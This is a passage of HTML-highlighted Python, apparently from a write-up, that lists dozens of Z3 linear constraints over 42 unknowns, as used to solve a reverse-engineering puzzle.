class="number">38</span>]+l[<span class="number">32</span>]+l[<span class="number">25</span>]-l[<span class="number">2</span>]+l[<span class="number">15</span>]+l[<span class="number">6</span>]+l[<span class="number">28</span>]-l[<span class="number">8</span>]-l[<span class="number">5</span>]-l[<span class="number">31</span>]-l[<span class="number">30</span>]-l[<span class="number">27</span>]==<span class="number">485</span>)</span><br><span class="line">s.add(l[<span class="number">13</span>]+l[<span class="number">19</span>]+l[<span class="number">21</span>]-l[<span class="number">2</span>]-l[<span class="number">33</span>]-l[<span class="number">0</span>]+l[<span class="number">39</span>]+l[<span class="number">31</span>]-l[<span class="number">23</span>]-l[<span class="number">41</span>]+l[<span class="number">38</span>]-l[<span class="number">29</span>]+l[<span class="number">36</span>]+l[<span class="number">24</span>]-l[<span class="number">20</span>]-l[<span class="number">9</span>]-l[<span class="number">32</span>]+l[<span class="number">37</span>]-l[<span class="number">35</span>]+l[<span class="number">40</span>]+l[<span class="number">7</span>]-l[<span class="number">26</span>]+l[<span class="number">15</span>]-l[<span class="number">10</span>]-l[<span class="number">6</span>]-l[<span class="number">16</span>]-l[<span class="number">4</span>]-l[<span class="number">5</span>]-l[<span class="number">30</span>]-l[<span class="number">14</span>]-l[<span class="number">22</span>]-l[<span class="number">25</span>]-l[<span class="number">34</span>]-l[<span class="number">17</span>]-l[<span class="number">11</span>]-l[<span class="number">27</span>]+l[<span class="number">1</span>]-l[<span class="number">28</span>]==-<span class="number">1068</span>)</span><br><span class="line">s.add(l[<span class="number">32</span>]+l[<span class="number">0</span>]+l[<span class="number">9</span>]+l[<span class="number">14</span>]+l[<span class="number">11</span>]+l[<span class="number">18</span>]-l[<span class="number">13</span>]+l[<span class="number">24</span>]-l[<span class="number">2</span>]-l[<span class="number">15</span>]+l[<span class="number">19</span>]-l[<span class="number">21</span>]+l[<span class="number">1</span>]+l[<span class="number">39</span>]-l[<span class="number">8</span>]-l[<span class="number">3</span>]+l[<span class="number">33</span>]+l[<span class="number">6</span>]-l[<span class="number">5</span>]-l[<span class="number">35</span>]-l[<span class="number">28</span>]+l[<span class="number">25</span>]-l[<span class="number">41</span>]+l[<span class="number">22</span>]-l[<span class="number">17</span>]+l[<span class="number">10</span>]+l[<span class="number">40</span>]+l[<span class="number">34</span>]+l[<span class="number">27</span>]-l[<span class="number">20</span>]+l[<span class="number">23</span>]+l[<span class="number">31</span>]-l[<span class="number">16</span>]+l[<span class="number">7</span>]+l[<span class="number">12</span>]-l[<span class="number">30</span>]+l[<span class="number">29</span>]-l[<span class="number">4</span>]==<span class="number">939</span>)</span><br><span class="line">s.add(l[<span class="number">19</span>]+l[<span class="number">11</span>]+l[<span class="number">20</span>]-l[<span class="number">16</span>]+l[<span class="number">40</span>]+l[<span class="number">25</span>]+l[<span class="number">1</span>]-l[<span class="number">31</span>]+l[<span class="number">28</span>]-l[<span class="number">23</span>]+l[<span class="number">14</span>]-l[<span class="number">9</span>]-l[<span class="number">27</span>]+l[<span class="number">35</span>]+l[<span class="number">39</span>]-l[<span class="number">37</span>]-l[<span class="number">8</span>]-l[<span class="number">22</span>]+l[<span class="number">5</span>]-l[<span class="number">6</span>]+l[<span class="number">0</span>]-l[<span class="number">32</span>]+l[<span class="number">24</span>]+l[<span class="number">33</span>]+l[<span class="number">29</span>]+l[<span class="number">38</span>]+l[<span class="number">15</span>]-l[<span class="number">2</span>]+l[<span class="number">30</span>]+l[<span class="number">7</span>]+l[<span class="number">12</span>]-l[<span class="number">3</span>]-l[<span class="number">17</span>]+l[<span class="number">34</span>]+l[<span class="number">41</span>]-l[<span class="number">4</span>]-l[<span class="number">13</span>]-l[<span class="number">26</span>]==<span class="number">413</span>)</span><br><span class="line">s.add(l[<span class="number">22</span>]+l[<span class="number">4</span>]-l[<span class="number">9</span>]+l[<span class="number">34</span>]+l[<span class="number">35</span>]+l[<span class="number">17</span>]+l[<span class="number">3</span>]-l[<span class="number">24</span>]+l[<span class="number">38</span>]-l[<span class="number">5</span>]-l[<span class="number">41</span>]-l[<span class="number">31</span>]-l[<span class="number">0</span>]-l[<span class="number">25</span>]+l[<span class="number">33</span>]+l[<span class="number">15</span>]-l[<span class="number">1</span>]-l[<span class="number">10</span>]+l[<span class="number">16</span>]-l[<span class="number">29</span>]-l[<span class="number">12</span>]+l[<span class="number">26</span>]-l[<span class="number">39</span>]-l[<span class="number">21</span>]-l[<span class="number">18</span>]-l[<span class="number">6</span>]-l[<span class="number">40</span>]-l[<span class="number">13</span>]+l[<span class="number">8</span>]+l[<span class="number">37</span>]+l[<span class="number">19</span>]+l[<span class="number">14</span>]+l[<span class="number">32</span>]+l[<span class="number">28</span>]-l[<span class="number">11</span>]+l[<span class="number">23</span>]+l[<span class="number">36</span>]+l[<span class="number">7</span>]==<span class="number">117</span>)</span><br><span class="line">s.add(l[<span class="number">32</span>]+l[<span class="number">16</span>]+l[<span class="number">3</span>]+l[<span class="number">11</span>]+l[<span class="number">34</span>]-l[<span class="number">31</span>]+l[<span class="number">14</span>]+l[<span class="number">25</span>]+l[<span class="number">1</span>]-l[<span class="number">30</span>]-l[<span class="number">33</span>]-l[<span class="number">40</span>]-l[<span class="number">4</span>]-l[<span class="number">29</span>]+l[<span class="number">18</span>]-l[<span class="number">27</span>]+l[<span class="number">13</span>]-l[<span class="number">19</span>]-l[<span class="number">12</span>]+l[<span class="number">23</span>]-l[<span class="number">39</span>]-l[<span class="number">41</span>]-l[<span class="number">8</span>]+l[<span class="number">22</span>]-l[<span class="number">5</span>]-l[<span class="number">38</span>]-l[<span class="number">9</span>]-l[<span class="number">37</span>]+l[<span class="number">17</span>]-l[<span class="number">36</span>]+l[<span class="number">24</span>]-l[<span class="number">21</span>]+l[<span class="number">2</span>]-l[<span class="number">26</span>]+l[<span class="number">20</span>]-l[<span class="number">7</span>]+l[<span class="number">35</span>]-l[<span class="number">0</span>]==-<span class="number">313</span>)</span><br><span class="line">s.add(l[<span class="number">40</span>]-l[<span class="number">1</span>]+l[<span class="number">5</span>]+l[<span class="number">7</span>]+l[<span class="number">33</span>]+l[<span class="number">29</span>]+l[<span class="number">12</span>]+l[<span class="number">38</span>]-l[<span class="number">31</span>]+l[<span class="number">2</span>]+l[<span class="number">14</span>]-l[<span class="number">35</span>]-l[<span class="number">8</span>]-l[<span class="number">24</span>]-l[<span class="number">39</span>]-l[<span class="number">9</span>]-l[<span class="number">28</span>]+l[<span class="number">23</span>]-l[<span class="number">17</span>]-l[<span class="number">22</span>]-l[<span class="number">26</span>]+l[<span class="number">32</span>]-l[<span class="number">11</span>]+l[<span class="number">4</span>]-l[<span class="number">36</span>]+l[<span class="number">10</span>]+l[<span class="number">20</span>]-l[<span class="number">18</span>]-l[<span class="number">16</span>]+l[<span class="number">6</span>]-l[<span class="number">0</span>]+l[<span class="number">3</span>]-l[<span class="number">30</span>]+l[<span class="number">37</span>]-l[<span class="number">19</span>]+l[<span class="number">21</span>]+l[<span class="number">25</span>]-l[<span class="number">15</span>]==-<span class="number">42</span>)</span><br><span class="line">s.add(l[<span class="number">21</span>]+l[<span class="number">26</span>]-l[<span class="number">17</span>]-l[<span class="number">25</span>]+l[<span class="number">27</span>]-l[<span class="number">22</span>]-l[<span class="number">39</span>]-l[<span class="number">23</span>]-l[<span class="number">15</span>]-l[<span class="number">20</span>]-l[<span class="number">32</span>]+l[<span class="number">12</span>]+l[<span class="number">3</span>]-l[<span class="number">6</span>]+l[<span class="number">28</span>]+l[<span class="number">31</span>]+l[<span class="number">13</span>]-l[<span class="number">16</span>]-l[<span class="number">37</span>]-l[<span class="number">30</span>]-l[<span class="number">5</span>]+l[<span class="number">41</span>]+l[<span class="number">29</span>]+l[<span class="number">36</span>]+l[<span class="number">1</span>]+l[<span class="number">11</span>]+l[<span class="number">24</span>]+l[<span class="number">18</span>]-l[<span class="number">40</span>]+l[<span class="number">19</span>]-l[<span class="number">35</span>]+l[<span class="number">2</span>]-l[<span class="number">38</span>]+l[<span class="number">14</span>]-l[<span class="number">9</span>]+l[<span class="number">4</span>]+l[<span class="number">0</span>]-l[<span class="number">33</span>]==<span class="number">289</span>)</span><br><span class="line">s.add(l[<span class="number">29</span>]+l[<span class="number">31</span>]+l[<span class="number">32</span>]-l[<span class="number">17</span>]-l[<span class="number">7</span>]+l[<span class="number">34</span>]+l[<span class="number">2</span>]+l[<span class="number">14</span>]+l[<span class="number">23</span>]-l[<span class="number">4</span>]+l[<span class="number">3</span>]+l[<span class="number">35</span>]-l[<span class="number">33</span>]-l[<span class="number">9</span>]-l[<span class="number">20</span>]-l[<span class="number">37</span>]+l[<span class="number">24</span>]-l[<span class="number">27</span>]+l[<span class="number">36</span>]+l[<span class="number">15</span>]-l[<span class="number">18</span>]-l[<span class="number">0</span>]+l[<span class="number">12</span>]+l[<span class="number">11</span>]-l[<span class="number">38</span>]+l[<span class="number">6</span>]+l[<span class="number">22</span>]+l[<span class="number">39</span>]-l[<span class="number">25</span>]-l[<span class="number">10</span>]-l[<span class="number">19</span>]-l[<span class="number">1</span>]+l[<span class="number">13</span>]-l[<span class="number">41</span>]+l[<span class="number">30</span>]-l[<span class="number">16</span>]+l[<span class="number">28</span>]-l[<span class="number">26</span>]==-<span class="number">117</span>)</span><br><span class="line">s.add(l[<span class="number">5</span>]+l[<span class="number">37</span>]-l[<span class="number">39</span>]+l[<span class="number">0</span>]-l[<span class="number">27</span>]+l[<span class="number">12</span>]+l[<span class="number">41</span>]-l[<span class="number">22</span>]+l[<span class="number">8</span>]-l[<span class="number">16</span>]-l[<span class="number">38</span>]+l[<span class="number">9</span>]+l[<span class="number">15</span>]-l[<span class="number">35</span>]-l[<span class="number">29</span>]+l[<span class="number">18</span>]+l[<span class="number">6</span>]-l[<span class="number">25</span>]-l[<span class="number">28</span>]+l[<span class="number">36</span>]+l[<span class="number">34</span>]+l[<span class="number">32</span>]-l[<span class="number">14</span>]-l[<span class="number">1</span>]+l[<span class="number">20</span>]+l[<span class="number">40</span>]-l[<span class="number">19</span>]-l[<span class="number">4</span>]-l[<span class="number">7</span>]+l[<span class="number">26</span>]+l[<span class="number">30</span>]-l[<span class="number">10</span>]+l[<span class="number">13</span>]-l[<span class="number">21</span>]+l[<span class="number">2</span>]-l[<span class="number">23</span>]-l[<span class="number">3</span>]-l[<span class="number">33</span>]==-<span class="number">252</span>)</span><br><span class="line">s.add(l[<span class="number">29</span>]+l[<span class="number">10</span>]-l[<span class="number">41</span>]-l[<span class="number">9</span>]+l[<span class="number">12</span>]-l[<span class="number">28</span>]+l[<span class="number">11</span>]+l[<span class="number">40</span>]-l[<span class="number">27</span>]-l[<span class="number">8</span>]+l[<span class="number">32</span>]-l[<span class="number">25</span>]-l[<span class="number">23</span>]+l[<span class="number">39</span>]-l[<span class="number">1</span>]-l[<span class="number">36</span>]-l[<span class="number">15</span>]+l[<span class="number">33</span>]-l[<span class="number">20</span>]+l[<span class="number">18</span>]+l[<span class="number">22</span>]-l[<span class="number">3</span>]+l[<span class="number">6</span>]-l[<span class="number">34</span>]-l[<span class="number">21</span>]+l[<span class="number">19</span>]+l[<span class="number">26</span>]+l[<span class="number">13</span>]-l[<span class="number">4</span>]+l[<span class="number">7</span>]-l[<span class="number">37</span>]+l[<span class="number">38</span>]-l[<span class="number">2</span>]-l[<span class="number">30</span>]-l[<span class="number">0</span>]-l[<span class="number">35</span>]+l[<span class="number">5</span>]+l[<span class="number">17</span>]==-<span class="number">183</span>)</span><br><span class="line">s.add(l[<span class="number">6</span>]-l[<span class="number">8</span>]-l[<span class="number">20</span>]+l[<span class="number">34</span>]-l[<span class="number">33</span>]-l[<span class="number">25</span>]-l[<span class="number">4</span>]+l[<span class="number">3</span>]+l[<span class="number">17</span>]-l[<span class="number">13</span>]-l[<span class="number">15</span>]-l[<span class="number">40</span>]+l[<span class="number">1</span>]-l[<span class="number">30</span>]-l[<span class="number">14</span>]-l[<span class="number">28</span>]-l[<span class="number">35</span>]+l[<span class="number">38</span>]-l[<span class="number">22</span>]+l[<span class="number">2</span>]+l[<span class="number">24</span>]-l[<span class="number">29</span>]+l[<span class="number">5</span>]+l[<span class="number">9</span>]+l[<span class="number">37</span>]+l[<span class="number">23</span>]-l[<span class="number">18</span>]+l[<span class="number">19</span>]-l[<span class="number">21</span>]+l[<span class="number">11</span>]+l[<span class="number">36</span>]+l[<span class="number">41</span>]-l[<span class="number">7</span>]-l[<span class="number">32</span>]+l[<span class="number">10</span>]+l[<span class="number">26</span>]-l[<span class="number">0</span>]+l[<span class="number">31</span>]==<span class="number">188</span>)</span><br><span class="line">s.add(l[<span class="number">3</span>]+l[<span class="number">6</span>]-l[<span class="number">41</span>]+l[<span class="number">10</span>]+l[<span class="number">39</span>]+l[<span class="number">37</span>]+l[<span class="number">1</span>]+l[<span class="number">8</span>]+l[<span class="number">21</span>]+l[<span class="number">24</span>]+l[<span class="number">29</span>]+l[<span class="number">12</span>]+l[<span class="number">27</span>]-l[<span class="number">38</span>]+l[<span class="number">11</span>]+l[<span class="number">23</span>]+l[<span class="number">28</span>]+l[<span class="number">33</span>]-l[<span class="number">31</span>]+l[<span class="number">14</span>]-l[<span class="number">5</span>]+l[<span class="number">32</span>]-l[<span class="number">17</span>]+l[<span class="number">40</span>]-l[<span class="number">34</span>]+l[<span class="number">20</span>]-l[<span class="number">22</span>]-l[<span class="number">16</span>]+l[<span class="number">19</span>]+l[<span class="number">2</span>]-l[<span class="number">36</span>]-l[<span class="number">7</span>]+l[<span class="number">18</span>]+l[<span class="number">15</span>]+l[<span class="number">26</span>]-l[<span class="number">0</span>]-l[<span class="number">4</span>]+l[<span class="number">35</span>]==<span class="number">1036</span>)</span><br><span class="line">s.add(l[<span class="number">28</span>]-l[<span class="number">33</span>]+l[<span class="number">2</span>]+l[<span class="number">37</span>]-l[<span class="number">12</span>]-l[<span class="number">9</span>]-l[<span class="number">39</span>]+l[<span class="number">16</span>]-l[<span class="number">32</span>]+l[<span class="number">8</span>]-l[<span class="number">36</span>]+l[<span class="number">31</span>]+l[<span class="number">10</span>]-l[<span class="number">4</span>]+l[<span class="number">21</span>]-l[<span class="number">25</span>]+l[<span class="number">18</span>]+l[<span class="number">24</span>]-l[<span class="number">0</span>]+l[<span class="number">29</span>]-l[<span class="number">26</span>]+l[<span class="number">35</span>]-l[<span class="number">22</span>]-l[<span class="number">41</span>]-l[<span class="number">6</span>]+l[<span class="number">15</span>]+l[<span class="number">19</span>]+l[<span class="number">40</span>]+l[<span class="number">7</span>]+l[<span class="number">34</span>]+l[<span class="number">17</span>]-l[<span class="number">3</span>]-l[<span class="number">13</span>]+l[<span class="number">5</span>]+l[<span class="number">23</span>]+l[<span class="number">11</span>]-l[<span class="number">27</span>]+l[<span class="number">1</span>]==<span class="number">328</span>)</span><br><span class="line">s.add(l[<span class="number">22</span>]-l[<span class="number">32</span>]+l[<span class="number">17</span>]-l[<span class="number">9</span>]+l[<span class="number">20</span>]-l[<span class="number">18</span>]-l[<span class="number">34</span>]+l[<span class="number">23</span>]+l[<span class="number">36</span>]-l[<span class="number">35</span>]-l[<span class="number">38</span>]+l[<span class="number">27</span>]+l[<span class="number">4</span>]-l[<span class="number">5</span>]-l[<span class="number">41</span>]+l[<span class="number">29</span>]+l[<span class="number">33</span>]+l[<span class="number">0</span>]-l[<span class="number">37</span>]+l[<span class="number">28</span>]-l[<span class="number">40</span>]-l[<span class="number">11</span>]-l[<span class="number">12</span>]+l[<span class="number">7</span>]+l[<span class="number">1</span>]+l[<span class="number">2</span>]-l[<span class="number">26</span>]-l[<span class="number">16</span>]-l[<span class="number">8</span>]+l[<span class="number">24</span>]-l[<span class="number">25</span>]+l[<span class="number">3</span>]-l[<span class="number">6</span>]-l[<span class="number">19</span>]-l[<span class="number">39</span>]-l[<span class="number">14</span>]-l[<span class="number">31</span>]+l[<span class="number">10</span>]==-<span class="number">196</span>)</span><br><span class="line">s.add(l[<span class="number">11</span>]+l[<span class="number">13</span>]+l[<span class="number">14</span>]-l[<span class="number">15</span>]-l[<span class="number">29</span>]-l[<span class="number">2</span>]+l[<span class="number">7</span>]+l[<span class="number">20</span>]+l[<span class="number">30</span>]-l[<span class="number">36</span>]-l[<span class="number">33</span>]-l[<span class="number">19</span>]+l[<span class="number">31</span>]+l[<span class="number">0</span>]-l[<span class="number">39</span>]-l[<span class="number">4</span>]-l[<span class="number">6</span>]+l[<span class="number">38</span>]+l[<span class="number">35</span>]-l[<span class="number">28</span>]+l[<span class="number">34</span>]-l[<span class="number">9</span>]-l[<span class="number">23</span>]-l[<span class="number">26</span>]+l[<span class="number">37</span>]-l[<span class="number">8</span>]-l[<span class="number">27</span>]+l[<span class="number">5</span>]-l[<span class="number">41</span>]+l[<span class="number">3</span>]+l[<span class="number">17</span>]+l[<span class="number">40</span>]-l[<span class="number">10</span>]+l[<span class="number">25</span>]+l[<span class="number">12</span>]-l[<span class="number">24</span>]+l[<span class="number">18</span>]+l[<span class="number">32</span>]==<span class="number">7</span>)</span><br><span class="line">s.add(l[<span class="number">34</span>]-l[<span class="number">37</span>]-l[<span class="number">40</span>]+l[<span class="number">4</span>]-l[<span class="number">22</span>]-l[<span class="number">31</span>]-l[<span class="number">6</span>]+l[<span class="number">38</span>]+l[<span class="number">13</span>]-l[<span class="number">28</span>]+l[<span class="number">8</span>]+l[<span class="number">30</span>]-l[<span class="number">20</span>]-l[<span class="number">7</span>]-l[<span class="number">32</span>]+l[<span class="number">26</span>]+l[<span class="number">1</span>]-l[<span class="number">18</span>]+l[<span class="number">5</span>]+l[<span class="number">35</span>]-l[<span class="number">24</span>]-l[<span class="number">41</span>]+l[<span class="number">9</span>]-l[<span class="number">0</span>]-l[<span class="number">2</span>]-l[<span class="number">15</span>]-l[<span class="number">10</span>]+l[<span class="number">12</span>]-l[<span class="number">36</span>]+l[<span class="number">33</span>]-l[<span class="number">16</span>]-l[<span class="number">14</span>]-l[<span class="number">25</span>]-l[<span class="number">29</span>]-l[<span class="number">21</span>]+l[<span class="number">27</span>]+l[<span class="number">3</span>]-l[<span class="number">17</span>]==-<span class="number">945</span>)</span><br><span class="line">s.add(l[<span class="number">12</span>]-l[<span class="number">30</span>]-l[<span class="number">8</span>]+l[<span class="number">20</span>]-l[<span class="number">2</span>]-l[<span class="number">36</span>]-l[<span class="number">25</span>]-l[<span class="number">0</span>]-l[<span class="number">19</span>]-l[<span class="number">28</span>]-l[<span class="number">7</span>]-l[<span class="number">11</span>]-l[<span class="number">33</span>]+l[<span class="number">4</span>]-l[<span class="number">23</span>]+l[<span class="number">10</span>]-l[<span class="number">41</span>]+l[<span class="number">39</span>]-l[<span class="number">32</span>]+l[<span class="number">27</span>]+l[<span class="number">18</span>]+l[<span class="number">15</span>]+l[<span class="number">34</span>]+l[<span class="number">13</span>]-l[<span class="number">40</span>]+l[<span class="number">29</span>]-l[<span class="number">6</span>]+l[<span class="number">37</span>]-l[<span class="number">14</span>]-l[<span class="number">16</span>]+l[<span class="number">38</span>]-l[<span class="number">26</span>]+l[<span class="number">17</span>]+l[<span class="number">31</span>]-l[<span class="number">22</span>]-l[<span class="number">35</span>]+l[<span class="number">5</span>]-l[<span class="number">1</span>]==-<span class="number">480</span>)</span><br><span class="line">s.add(l[<span class="number">36</span>]-l[<span class="number">11</span>]-l[<span class="number">34</span>]+l[<span class="number">8</span>]+l[<span class="number">0</span>]+l[<span class="number">15</span>]+l[<span class="number">28</span>]-l[<span class="number">39</span>]-l[<span class="number">32</span>]-l[<span class="number">2</span>]-l[<span class="number">27</span>]+l[<span class="number">22</span>]+l[<span class="number">16</span>]-l[<span class="number">30</span>]-l[<span class="number">3</span>]+l[<span class="number">31</span>]-l[<span class="number">26</span>]+l[<span class="number">20</span>]+l[<span class="number">17</span>]-l[<span class="number">29</span>]-l[<span class="number">18</span>]+l[<span class="number">19</span>]-l[<span class="number">10</span>]+l[<span class="number">6</span>]-l[<span class="number">5</span>]-l[<span class="number">38</span>]-l[<span class="number">25</span>]-l[<span class="number">24</span>]+l[<span class="number">4</span>]+l[<span class="number">23</span>]+l[<span class="number">9</span>]+l[<span class="number">14</span>]+l[<span class="number">21</span>]-l[<span class="number">37</span>]+l[<span class="number">13</span>]-l[<span class="number">41</span>]-l[<span class="number">12</span>]+l[<span class="number">35</span>]==-<span class="number">213</span>)</span><br><span class="line">s.add(l[<span class="number">19</span>]-l[<span class="number">36</span>]-l[<span class="number">12</span>]+l[<span class="number">33</span>]-l[<span class="number">27</span>]-l[<span class="number">37</span>]-l[<span class="number">25</span>]+l[<span class="number">38</span>]+l[<span class="number">16</span>]-l[<span class="number">18</span>]+l[<span class="number">22</span>]-l[<span class="number">39</span>]+l[<span class="number">13</span>]-l[<span class="number">7</span>]-l[<span class="number">31</span>]-l[<span class="number">26</span>]+l[<span class="number">15</span>]-l[<span class="number">10</span>]-l[<span class="number">9</span>]-l[<span class="number">2</span>]-l[<span class="number">30</span>]-l[<span class="number">11</span>]+l[<span class="number">41</span>]-l[<span class="number">4</span>]+l[<span class="number">24</span>]+l[<span class="number">34</span>]+l[<span class="number">5</span>]+l[<span class="number">17</span>]+l[<span class="number">14</span>]+l[<span class="number">6</span>]+l[<span class="number">8</span>]-l[<span class="number">21</span>]-l[<span class="number">23</span>]+l[<span class="number">32</span>]-l[<span class="number">1</span>]-l[<span class="number">29</span>]-l[<span class="number">0</span>]+l[<span class="number">3</span>]==-<span class="number">386</span>)</span><br><span class="line">s.add(l[<span class="number">0</span>]+l[<span class="number">7</span>]-l[<span class="number">28</span>]-l[<span class="number">38</span>]+l[<span class="number">19</span>]+l[<span class="number">31</span>]-l[<span class="number">5</span>]+l[<span class="number">24</span>]-l[<span class="number">3</span>]+l[<span class="number">33</span>]-l[<span class="number">12</span>]-l[<span class="number">29</span>]+l[<span class="number">32</span>]+l[<span class="number">1</span>]-l[<span class="number">34</span>]-l[<span class="number">9</span>]-l[<span class="number">25</span>]+l[<span class="number">26</span>]-l[<span class="number">8</span>]+l[<span class="number">4</span>]-l[<span class="number">10</span>]+l[<span class="number">40</span>]-l[<span class="number">15</span>]-l[<span class="number">11</span>]-l[<span class="number">27</span>]+l[<span class="number">36</span>]+l[<span class="number">14</span>]+l[<span class="number">41</span>]-l[<span class="number">35</span>]-l[<span class="number">13</span>]-l[<span class="number">17</span>]-l[<span class="number">21</span>]-l[<span class="number">18</span>]+l[<span class="number">39</span>]-l[<span class="number">2</span>]+l[<span class="number">20</span>]-l[<span class="number">23</span>]-l[<span class="number">22</span>]==-<span class="number">349</span>)</span><br><span class="line">s.add(l[<span class="number">10</span>]+l[<span class="number">22</span>]+l[<span class="number">21</span>]-l[<span class="number">0</span>]+l[<span class="number">15</span>]-l[<span class="number">6</span>]+l[<span class="number">20</span>]-l[<span class="number">29</span>]-l[<span class="number">30</span>]-l[<span class="number">33</span>]+l[<span class="number">19</span>]+l[<span class="number">23</span>]-l[<span class="number">28</span>]+l[<span class="number">41</span>]-l[<span class="number">27</span>]-l[<span class="number">12</span>]-l[<span class="number">37</span>]-l[<span class="number">32</span>]+l[<span class="number">34</span>]-l[<span class="number">36</span>]+l[<span class="number">3</span>]+l[<span class="number">1</span>]-l[<span class="number">13</span>]+l[<span class="number">18</span>]+l[<span class="number">14</span>]+l[<span class="number">9</span>]+l[<span class="number">7</span>]-l[<span class="number">39</span>]+l[<span class="number">8</span>]+l[<span class="number">2</span>]-l[<span class="number">31</span>]-l[<span class="number">5</span>]-l[<span class="number">40</span>]+l[<span class="number">38</span>]-l[<span class="number">26</span>]-l[<span class="number">4</span>]+l[<span class="number">16</span>]-l[<span class="number">25</span>]==<span class="number">98</span>)</span><br><span class="line">s.add(l[<span class="number">28</span>]+l[<span class="number">38</span>]+l[<span class="number">20</span>]+l[<span class="number">0</span>]-l[<span class="number">5</span>]-l[<span class="number">34</span>]-l[<span class="number">41</span>]+l[<span class="number">22</span>]-l[<span class="number">26</span>]+l[<span class="number">11</span>]+l[<span class="number">29</span>]+l[<span class="number">31</span>]-l[<span class="number">3</span>]-l[<span class="number">16</span>]+l[<span class="number">23</span>]+l[<span class="number">17</span>]-l[<span class="number">18</span>]+l[<span class="number">9</span>]-l[<span class="number">4</span>]-l[<span class="number">12</span>]-l[<span class="number">19</span>]-l[<span class="number">40</span>]-l[<span class="number">27</span>]+l[<span class="number">33</span>]+l[<span class="number">8</span>]-l[<span class="number">37</span>]+l[<span class="number">2</span>]+l[<span class="number">15</span>]-l[<span class="number">24</span>]-l[<span class="number">39</span>]+l[<span class="number">10</span>]+l[<span class="number">35</span>]-l[<span class="number">1</span>]+l[<span class="number">30</span>]-l[<span class="number">36</span>]-l[<span class="number">25</span>]-l[<span class="number">14</span>]-l[<span class="number">32</span>]==-<span class="number">412</span>)</span><br><span class="line">s.add(l[<span class="number">1</span>]-l[<span class="number">24</span>]-l[<span class="number">29</span>]+l[<span class="number">39</span>]+l[<span class="number">41</span>]+l[<span class="number">0</span>]+l[<span class="number">9</span>]-l[<span class="number">19</span>]+l[<span class="number">6</span>]-l[<span class="number">37</span>]-l[<span class="number">22</span>]+l[<span class="number">32</span>]+l[<span class="number">21</span>]+l[<span class="number">28</span>]+l[<span class="number">36</span>]+l[<span class="number">4</span>]-l[<span class="number">17</span>]+l[<span class="number">20</span>]-l[<span class="number">13</span>]-l[<span class="number">35</span>]-l[<span class="number">5</span>]+l[<span class="number">33</span>]-l[<span class="number">27</span>]-l[<span class="number">30</span>]+l[<span class="number">40</span>]+l[<span class="number">25</span>]-l[<span class="number">18</span>]+l[<span class="number">34</span>]-l[<span class="number">3</span>]-l[<span class="number">10</span>]-l[<span class="number">16</span>]-l[<span class="number">23</span>]-l[<span class="number">38</span>]+l[<span class="number">8</span>]-l[<span class="number">14</span>]-l[<span class="number">11</span>]-l[<span class="number">7</span>]+l[<span class="number">12</span>]==-<span class="number">95</span>)</span><br><span class="line">s.add(l[<span class="number">2</span>]-l[<span class="number">24</span>]+l[<span class="number">31</span>]+l[<span class="number">0</span>]+l[<span class="number">9</span>]-l[<span class="number">6</span>]+l[<span class="number">7</span>]-l[<span class="number">1</span>]-l[<span class="number">22</span>]+l[<span class="number">8</span>]-l[<span class="number">23</span>]+l[<span class="number">40</span>]+l[<span class="number">20</span>]-l[<span class="number">38</span>]-l[<span class="number">11</span>]-l[<span class="number">14</span>]+l[<span class="number">18</span>]-l[<span class="number">36</span>]+l[<span class="number">15</span>]-l[<span class="number">4</span>]-l[<span class="number">41</span>]-l[<span class="number">12</span>]-l[<span class="number">34</span>]+l[<span class="number">32</span>]-l[<span class="number">35</span>]+l[<span class="number">17</span>]-l[<span class="number">21</span>]-l[<span class="number">10</span>]-l[<span class="number">29</span>]+l[<span class="number">39</span>]-l[<span class="number">16</span>]+l[<span class="number">27</span>]+l[<span class="number">26</span>]-l[<span class="number">3</span>]-l[<span class="number">5</span>]+l[<span class="number">13</span>]+l[<span class="number">25</span>]-l[<span class="number">28</span>]==-<span class="number">379</span>)</span><br><span class="line">s.add(l[<span class="number">19</span>]-l[<span class="number">17</span>]+l[<span class="number">31</span>]+l[<span class="number">14</span>]+l[<span class="number">6</span>]-l[<span class="number">12</span>]+l[<span class="number">16</span>]-l[<span class="number">8</span>]+l[<span class="number">27</span>]-l[<span class="number">13</span>]+l[<span class="number">41</span>]+l[<span class="number">2</span>]-l[<span class="number">7</span>]+l[<span class="number">32</span>]+l[<span class="number">1</span>]+l[<span class="number">25</span>]-l[<span class="number">9</span>]+l[<span class="number">37</span>]+l[<span class="number">34</span>]-l[<span class="number">18</span>]-l[<span class="number">40</span>]-l[<span class="number">11</span>]-l[<span class="number">10</span>]+l[<span class="number">38</span>]+l[<span class="number">21</span>]+l[<span class="number">3</span>]-l[<span class="number">0</span>]+l[<span class="number">24</span>]+l[<span class="number">15</span>]+l[<span class="number">23</span>]-l[<span class="number">20</span>]+l[<span class="number">26</span>]+l[<span class="number">22</span>]-l[<span class="number">4</span>]-l[<span class="number">28</span>]-l[<span class="number">5</span>]+l[<span class="number">39</span>]+l[<span class="number">35</span>]==<span class="number">861</span>)</span><br><span class="line">s.add(l[<span class="number">35</span>]+l[<span class="number">36</span>]-l[<span class="number">16</span>]-l[<span class="number">26</span>]-l[<span class="number">31</span>]+l[<span class="number">0</span>]+l[<span class="number">21</span>]-l[<span class="number">13</span>]+l[<span class="number">14</span>]+l[<span class="number">39</span>]+l[<span class="number">7</span>]+l[<span class="number">4</span>]+l[<span class="number">34</span>]+l[<span class="number">38</span>]+l[<span class="number">17</span>]+l[<span class="number">22</span>]+l[<span class="number">32</span>]+l[<span class="number">5</span>]+l[<span class="number">15</span>]+l[<span class="number">8</span>]-l[<span class="number">29</span>]+l[<span class="number">40</span>]+l[<span class="number">24</span>]+l[<span class="number">6</span>]+l[<span class="number">30</span>]-l[<span class="number">2</span>]+l[<span class="number">25</span>]+l[<span class="number">23</span>]+l[<span class="number">1</span>]+l[<span class="number">12</span>]+l[<span class="number">9</span>]-l[<span class="number">10</span>]-l[<span class="number">3</span>]-l[<span class="number">19</span>]+l[<span class="number">20</span>]-l[<span class="number">37</span>]-l[<span class="number">33</span>]-l[<span class="number">18</span>]==<span class="number">1169</span>)</span><br><span class="line">s.add(l[<span class="number">13</span>]+l[<span class="number">0</span>]-l[<span class="number">25</span>]-l[<span class="number">32</span>]-l[<span class="number">21</span>]-l[<span class="number">34</span>]-l[<span class="number">14</span>]-l[<span class="number">9</span>]-l[<span class="number">8</span>]-l[<span class="number">15</span>]-l[<span class="number">16</span>]+l[<span class="number">38</span>]-l[<span class="number">35</span>]-l[<span class="number">30</span>]-l[<span class="number">40</span>]-l[<span class="number">12</span>]+l[<span class="number">3</span>]-l[<span class="number">19</span>]+l[<span class="number">4</span>]-l[<span class="number">41</span>]+l[<span class="number">2</span>]-l[<span 